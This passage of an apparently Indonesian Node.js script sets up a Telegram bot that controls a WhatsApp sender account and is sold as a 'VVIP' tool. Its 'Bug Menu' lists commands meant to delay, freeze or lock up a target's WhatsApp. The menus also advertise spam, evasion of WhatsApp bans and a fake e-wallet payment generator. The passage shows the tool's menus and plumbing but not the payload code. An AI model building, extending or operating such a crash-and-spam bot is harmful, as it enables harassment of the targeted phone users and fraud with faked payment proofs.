⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = import('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}




const bot = new Telegraf(BOT_TOKEN);
bot.use(session());
let tokenValidated = false; // volatile gate: import token each restart


const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀             「〔 ACCES GRANTED 〕」
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠖⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⢤⡀⠀⠀⠀⠀⢸⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡀⠈⠢⡀⠀⠀⢀⠀⠈⡄⠀⠀⠀⠀⠀⠀⠀⠀⡔⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠊⡹⠀⠀⠘⢄⠀⠈⠲⢖⠈⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⠀⠙⣄⠈⠢⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠖⠁⢠⠞⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠉⠑⠢⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡠⠚⠁⠀⠀⠀⡇⠀⠀⠀⠀⠀⢀⠇⠀⡤⡀⠀⠀⠀⢀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⢠⣾⣿⣷⣶⣤⣄⣉⠑⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⠞⢁⣴⣾⣿⣿⡆⢇⠀⠀⠀⠀⠀⠸⡀⠀⠂⠿⢦⡰⠀⠀⠋⡄⠀⠀⠀⠀⠀⠀⠀⢰⠁⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⢆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡴⢁⣴⣿⣿⣿⣿⣿⣿⡘⡄⠀⠀⠀⠀⠀⠱⣔⠤⡀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⠀⠀⡜⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⢣⠀⠀⠀⠀⠀
⠀⠀⡼⢠⣾⣿⣿⣿⣿⣿⣿⣿⣧⡘⢆⠀⠀⠀⠀⠀⢃⠑⢌⣦⠀⠩⠉⠀⡜⠀⠀⠀⠀⠀⠀⢠⠃⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣣⡀⠀⠀⠀
⠀⠀⢰⢃⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠱⡀⠀⠀⠀⢸⠀⠀⠓⠭⡭⠙⠋⠀⠀⠀⠀⠀⠀⠀⡜⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡱⡄⠀⠀
⠀⠀⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢃⠀⠀⠀⢸⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⢀⠜⢁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠘⣆⠀
⠀⢸⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡘⣆⠀⠀⡆⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⡠⠖⣡⣾⠁⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢸⠀
⠀⡏⣾⣿⣿⣿⣿⡿⡛⢟⢿⣿⣿⣿⣿⣿⣿⣧⡈⢦⣠⠃⠀⠀⠀⠀⠀⢱⣀⠤⠒⢉⣾⡉⠻⠋⠈⢘⢿⣿⣿⣿⣿⠿⣿⣿⠏⠉⠻⢿⣿⣿⣿⣿⡘⡆
⢰⡇⣿⣿⠟⠁⢸⣠⠂⡄⣃⠜⣿⣿⠿⠿⣿⣿⡿⠦⡎⠀⠀⠀⠀⠀⠒⠉⠉⠑⣴⣿⣿⣎⠁⠠⠂⠮⢔⣿⡿⠉⠁⠀⠹⡛⢀⣀⡠⠀⠙⢿⣿⣿⡇⡇
⠘⡇⠏⠀⠀⠀⡾⠤⡀⠑⠒⠈⠣⣀⣀⡀⠤⠋⢀⡜⣀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠙⢿⡟⠉⡃⠈⢀⠴⣿⣿⣀⡀⠀⠀⠀⠈⡈⠊⠀⠀⠀⠀⠙⢿⡇⡇
⠀⠿⠀⠀⠀⠀⠈⠀⠉⠙⠓⢤⣀⠀⠁⣀⡠⢔⡿⠊⠀⠀⠀⠀⠙⢦⡀⠀⠐⠢⢄⡀⠁⡲⠃⠀⡜⠀⠹⠟⠻⣿⣰⡐⣄⠎⠀⠀⠀⠀⠀⠀⠀⠀⢣⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠱⡀⠀⠀⠀⠙⢦⣀⢀⡴⠁⠀⠀⠀⠀⠉⠁⢱⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠈⢏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠈⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡜⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⢀⡴⠁⠀⠀⢀⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⠀⠀⠀⠘⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⣧⣠⠤⠤⠋⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⡀⠀⠀⠀⠳⢄⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠊⠈⠁⠀⠀⠀⡔⠛⠲⣤⣀⣀⣀⠀⠈⢣⡀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⢀⡠⢔⠝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢈⠤⠒⣀⠀⠀⠀⠀⣀⠟⠀⠀⠀⠑⠢⢄⡀⠀⠀⠈⡗⠂⠀⠀⠀⠙⢦⠤⠒⢊⡡⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠒⣒⡁⠬⠦⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠒⢺⢠⠤⡀⢀⠤⡀⠠⠷⡊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠣⡀⡱⠧⡀⢰⠓⠤⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `))
    
const store = makeInMemoryStore({
  logger: pino().child({ level: 'silent', stream: 'store' })
});
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐚𝐧𝐭𝐡𝐫𝐚 𝐂⧁𝐑𝐄⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢡⡀⢀⣠⣤⠤⠷⠤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⣀⡴⠟⠉⢠⡀⠠⢤⣄⣠⠀⠉⠻⢦⡀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠄⠀⠀⠈⢳⡞⠉⠀⠀⠀⣠⡇⢀⠄⠀⢷⡀⠀⠀⠀⠘⣶⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⡟⠉⠒⠦⣄⣠⡏⠀⠀⠀⠀⢰⣿⢀⣴⣶⣦⡄⣻⠄⢀⢀⣠⣤⢧⣄⣠⠤⠒⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣿⡋⠀⠀⠀⠀⠀⡟⠀⠀⢠⣠⠀⠀⠹⣿⣿⣿⣿⣿⠋⠀⠈⡍⠀⠀⠈⣿⠀⠀⠀⠀⠒⢦⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡏⠀⠀⠀⣀⣀⣸⠁⠀⠀⣆⠙⣿⣆⢠⣿⣷⣿⣿⣷⠀⣠⣾⣷⡞⠀⠀⢹⣀⣀⣀⣀⠀⢸⣷⣧⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠸⡄⠀⢀⡘⢦⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣩⠇⡀⠀⢸⠀⠀⠀⠀⠉⢸⣿⣿⣿⣮⡁⡀⠀⠀⠀⠀
⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⢄⡀⠀⠀⠀⢀⣷⡸⣄⣙⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣖⡚⠁⢀⣞⡀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡴⣔⠀⠀⠀
⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠐⠺⡏⣍⣁⠀⣽⣿⣿⣿⣿⣿⣿⣽⣿⣯⣽⣿⣿⣿⣍⢁⡜⠉⠉⠓⢤⣄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠠⣷⣿⣗⡤⠈⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⠛⢤⡀⠀⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀
⠀⣿⣿⣿⣿⣿⠿⢿⣿⣿⠿⢿⣿⣿⣿⣿⣷⡀⠈⣿⣿⣄⠀⣿⣿⣿⠁⠹⣿⣿⣿⣿⣿⢿⣿⣗⠀⠀⠀⠉⠂⣠⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⢀⡿⡿⠉⣿⡟⠀⢸⣿⠏⠀⠀⢹⠿⠿⢿⣿⣷⣄⠚⢿⣿⣿⣿⡿⠃⢈⣹⣿⣿⣿⣿⣿⡎⢿⣿⣇⠀⠀⣶⣴⣿⣿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⢸⣿⣿⣾⣿⡇⠀⢸⠋⠀⠀⠀⠸⠀⠀⠀⠉⠛⣿⣷⣟⣙⠿⣿⡁⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⢿⣿⠟⢿⡏⠀⢸⠉⠁⠀⠈⢹⢿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⡇⠀⠾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠍⠛⢿⠷⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣆⠀⠁⠀⠀⠀⠀⠈⠀⠀⠀⠀⠞⠀⠘⣿⣿⣟
⢸⣿⣿⣏⣿⡗⠀⠀⠀⠀⠀⠀⣠⠒⠊⠉⠉⠉⢉⣒⠦⣄⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣤⣿⣿⠿⠶⠶⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇
⠘⣿⣷⣿⡝⠁⠀⠀⠀⠀⠀⠉⢁⠀⠀⠀⠀⠀⠀⠈⢹⣮⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠙⠀⠀⠀⠀⠀⠀⠈⠛⢆⠀⠀⠀⠀⠀⠀⠀⠋⢻⡇
⠀⠻⣿⣤⠁⠀⠀⠀⠀⠀⣤⠈⠋⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⠀⠀⠀⠀⠀⢠⡿⠁
⠀⠀⢻⣧⡀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⣼⠃⠀
⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣧⠀⠀⣀⡼⠁⠀⠀
⠀⠀⠀⠀⠙⢶⡀⠀⠀⠀⠀⢿⣷⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠀⠀⠛⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠙⠏⠉⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⢿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣷⣀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣞⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿⣿⡿⣾⢻⣿⣿⡟⢻⣿⣿⣿⣿⣿⣿⠙⠳⢤⣀⣀⣀⣠⡤⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

「I」 「〔 SENDER CONNECT 〕」 「I」 `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};


const { RichHTMLBuilder: HTML } = RichMessage;

const checkWhatsAppConnection = async (ctx, next) => {
  if (isWhatsAppConnected && sock?.user) {
    return next();
  }

  const msg = new HTML()

    .heading(
      1,
      HTML.customEmoji("5355021020572962395", "📡") +
      " Sender Offline"
    )

    .divider()

    .blockQuote(
      HTML.bold("WhatsApp Sender is currently disconnected.")
    )

    .paragraph(
      "Bot tidak dapat menjalankan fitur yang membutuhkan koneksi WhatsApp.\n\n" +
      "Silakan hubungkan Sender terlebih dahulu sebelum menggunakan command ini."
    )

    .divider()

    .table(
      [
        ["Status", "Value"],
        ["Connection", "Offline ❌"],
        ["Required", "WhatsApp Sender"],
        ["Action", "Connect Sender"]
      ],
      {
        bordered: true,
        striped: true,
        hasHeader: true
      }
    )

    .divider()

    .taskList(
      {
        text: "Telegram Connected",
        checked: true
      },
      {
        text: "WhatsApp Sender Connected",
        checked: false
      }
    )

    .details(
      "📖 Information",
      "Pastikan perangkat WhatsApp telah login kembali. Setelah status berubah menjadi Connected, seluruh command akan kembali dapat digunakan."
    )

    .footer(
      "© Xilent Death " +
      HTML.customEmoji("6093786598422353987", "👑")
    )

    .build();

  return await ctx.sendRichMessage(msg, {
    protect_content: true,
    reply_markup: Markup.inlineKeyboard([
      [
        {
          text: "Developer",
          url: "https://t.me/gaponback",
          style: "success",
          icon_custom_emoji_id: "6104897532788215057"
        }
      ]
    ]).reply_markup
  });
};

// Menu START
const PHOTOS = [
  "https://ziperrimg2.lovable.app/f/da6aomig7g.jpg",
  "https://ziperrimg2.lovable.app/f/3xd5m5xtsq.jpg",
  "https://ziperrimg2.lovable.app/f/hrbn2ygsw9.jpg"
];

bot.start(async (ctx) => {
const DRAFT_ID = 1  

  const steps = [
  "⚡ Initializing Xenova...",
  "📡 Connecting Telegram...",
  "🛡️ Loading Security Module...",
  "📦 Loading Resources...",
  "👑 Preparing Rich Menu...",
  "✨ Done!"
];

  for (const step of steps) {
    await ctx.sendRichMessageDraft(
      DRAFT_ID,
      new HTML().thinking(HTML.italic(step)).build()
    )
    await new Promise((r) => setTimeout(r, 900))
  }


  const msg = new HTML()
  
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    
    .heading(
  1,
  "𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑼𝒔𝒆𝒓" +
  HTML.customEmoji("6129608584176076842", "🕷") +
  " 」"
)

    .paragraph(
      `𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐗𝐞𝐧𝐨𝐯𝐚 𝐒𝐢𝐥𝐞𝐧𝐭`
    + HTML.customEmoji("6093786598422353987", "👑" ) 
    )

    .divider()

    .heading(2, HTML.customEmoji("4956680567853679460", "💋") + " Bot Information")

    .table(
      
      [
        ["Information", "Detail"],
        ["Name", "Xenova Seventeen"],
        ["Version", "1.0 ( Rich Mode )"],
        ["Status", "🟢 Online"],
        ["System", "Auto Update"]
      ],
      {
        bordered: true,
        striped: true,
        hasHeader: true
      }
    )
  .taskList(
  { text: "Telegram Connected", checked: true },
  { text: "WhatsApp Sender Connected", checked: false },
  { text: "Bebas Spam Bug", checked: true }
)
    .divider()
    .details(
    "<tg-emoji emoji-id='5350725709679584478'>✨</tg-emoji>Important Information",
      `
  
      SCRIPT INI VVIP DAN VERSI TERBARU JIKA ADA SARAN ATAU EROR HUBUNGI DEV @kazeenewera
      `
       )
    .blockQuote(HTML.bold("<tg-emoji emoji-id='5353024084118629688'>▶️</tg-emoji>「 ! 」Select Menu Below 「 ! 」"))
 .audio('https://b.top4top.io/m_3858qq9s11.mp3', '<tg-emoji emoji-id="5350759382223186548">⚔️</tg-emoji>Xenova — Silent ')
    .build();

  await ctx.sendRichMessage(msg, {
  protect_content: true, 
  reply_markup: Markup.inlineKeyboard([
    [
  {
    text: "Bug Menu",
    callback_data: "xbug",
    style: "danger",
    icon_custom_emoji_id: "5355021020572962395"
  },
  {
    text: "Owner Menu",
    callback_data: "owner",
    style: "danger",
    icon_custom_emoji_id: "6248910861419680249"
  },
],
[
  {
    text: "Tools Menu",
    callback_data: "toolscoy",
    style: "primary",
    icon_custom_emoji_id: "5316790180936431490"
  }
],
[
  {
    text: "Developer Script",
    url: "https://t.me/gaponback",
    style: "success",
    icon_custom_emoji_id: "6104897532788215057"
  }
]
]).reply_markup
});

});

// Menu SETTING
bot.action("owner", async (ctx) => {
  const userId = ctx.from.id.toString();
  const waStatus = sock && sock.user ? "✅ Terhubung" : "❌ Tidak Terhubung";
  const ICON_BACK = "5776091084467735768"
        
  const msg = new HTML()
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    .heading(2, '📊 Informasi Setting Menu')
    .table(
      [
  ['Command', 'Example', 'Description'],

  [
    `/addadmin <id_tele>, <durasi>\nContoh: /addadmin ${userId}, 30d`, 
    'Memberikan akses dan title Admin pada script.'
  ],

  [
    '/deladmin',
    `/deladmin <id_tele> Contoh: /deladmin ${userId}`,
    'Menghapus akses dan title Admin dari script.'
  ],

  [
    '/addprem',
    `/addprem <id_tele>, <durasi> Contoh: /addprem ${userId}, 30d`,
    'Memberikan akses dan title Premium pada script.'
  ],

  [
    '/delprem',
    `/delprem <id_tele> Contoh: /delprem ${userId}`,
    'Menghapus akses dan title Premium dari script.'
  ],

  [
    ' /cekprem',
    'Ketik: /cekprem',
    'Menampilkan status Premium akun Anda.'
  ],

  [
    '/addsender',
    '/addsender <nomor_wa> Contoh: /addsender 628123456789',
    'Menambahkan nomor WhatsApp ke Sender Telegram.'
  ],

  [
    '/resetsession',
    'Ketik: /resetsession',
    'Menghapus seluruh sesi WhatsApp yang terhubung.'
  ],

  [
    '/status',
    'Ketik: /status',
    'Menampilkan status koneksi Sender WhatsApp.'
  ]
      ],
      {
        bordered: true,
        striped: true,
        hasHeader: true
      }
    )
    .divider()
    .footer("© Xenova Seventeen" + HTML.customEmoji("4956680567853679460", "💋"))
    .build();
    
  await ctx.sendRichMessage(msg, {
    reply_markup: Markup.inlineKeyboard([
      [
        {
          text: "Back",
          callback_data: "back_to_start",
          style: "danger",
          icon_custom_emoji_id: ICON_BACK
        }
      ]
    ]).reply_markup
  });
});
bot.action("xbug", async (ctx) => {
  await ctx.answerCbQuery();
  const ICON_BACK = "5776091084467735768"
  const msg = new HTML()
  
      .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    
    .heading(1, "<tg-emoji emoji-id='5244994150406839598'>🧛</tg-emoji> Bug Menu Xenova Silent")
    
    .divider()

    .heading(2, HTML.customEmoji("6129608584176076842", "🕷") + " Command Bug")

    .table(
      [
        ["Command", "Efek"],
        ["/Xoya", "Mid Delay"],
        ["/Xinfinity", "Delay Hard"],
        ["/IntersOrder", "Stuck Home"],
        ["/HitOver", "Delay To Freeze"]
      ],
      {
        bordered: true,
        striped: true,
        hasHeader: true
      }
    )

    .divider()

  .heading(2, "<tg-emoji emoji-id='5316827280863934685'>✅</tg-emoji> Infomation Bugs")
  .taskList(
    {
      text: "Target Auto C1",
      checked: true
    },
    {
      text: "Bug Gacor",
      checked: true
    },
    {
      text: "Bebas Spam",
      checked: false
    },
    {
      text: "Anti Kenon 80%",
      checked: true
    }
  )
  
  .details(
  " <tg-emoji emoji-id='5316832430529722441'>⚙️</tg-emoji>Important Information",
  `
  Jika Ada Kendala Dengan Bug
  Atau Error Bisa Hubungi @kazeenewera Dan Sarankan Saya Fitur yang menarik wkwk
 
  `
)

  .build();

  await ctx.sendRichMessage(msg, {
    reply_markup: Markup.inlineKeyboard([
      [
        {
          text: "Back",
          callback_data: "back_to_start",
          style: "danger",
          icon_custom_emoji_id: ICON_BACK
        }
      ]
    ]).reply_markup
  });
});
bot.action("toolscoy", async (ctx) => {
  await ctx.answerCbQuery();
  const ICON_BACK = "5776091084467735768"
  const msg = new HTML()
  
      .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    
    .heading(1, "<tg-emoji emoji-id='5352590867947349905'>⚡️</tg-emoji>𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖 𝑿𝒆𝒏𝒐𝒗𝒂  <tg-emoji emoji-id='5352590867947349905'>⚡️</tg-emoji>")
    
    .divider()

    .heading(2, HTML.customEmoji("6129608584176076842", "🕷") + " Command Tools")

    .table(
      [
        ["<tg-emoji emoji-id='5350582150397718891'>🦋</tg-emoji>Command", "<tg-emoji emoji-id='5350357424823888008'>‼️</tg-emoji>Fungsi"],
        ["<tg-emoji emoji-id='5355075407743826720'>🔜</tg-emoji>/waktusholat", "on/off"],
        ["<tg-emoji emoji-id='5355075407743826720'>🔜</tg-emoji>/tiktok", "Download Video tiktok dri link"],
        ["<tg-emoji emoji-id='5355075407743826720'>🔜</tg-emoji>/play", "Searh Lagu."],
        ["<tg-emoji emoji-id='5355075407743826720'>🔜</tg-emoji>/fakedana", "untuk preng temen"]
      ],
      {
        bordered: true,
        striped: true,
        hasHeader: true
      }
    )

    .divider()

  .heading(2, "<tg-emoji emoji-id='5316827280863934685'>✅</tg-emoji>Infomation Tools")
  .taskList(
    {
      text: "Bebas Spam",
      checked: true
    },
    {
      text: "Anti Eror",
      checked: true
    },
    {
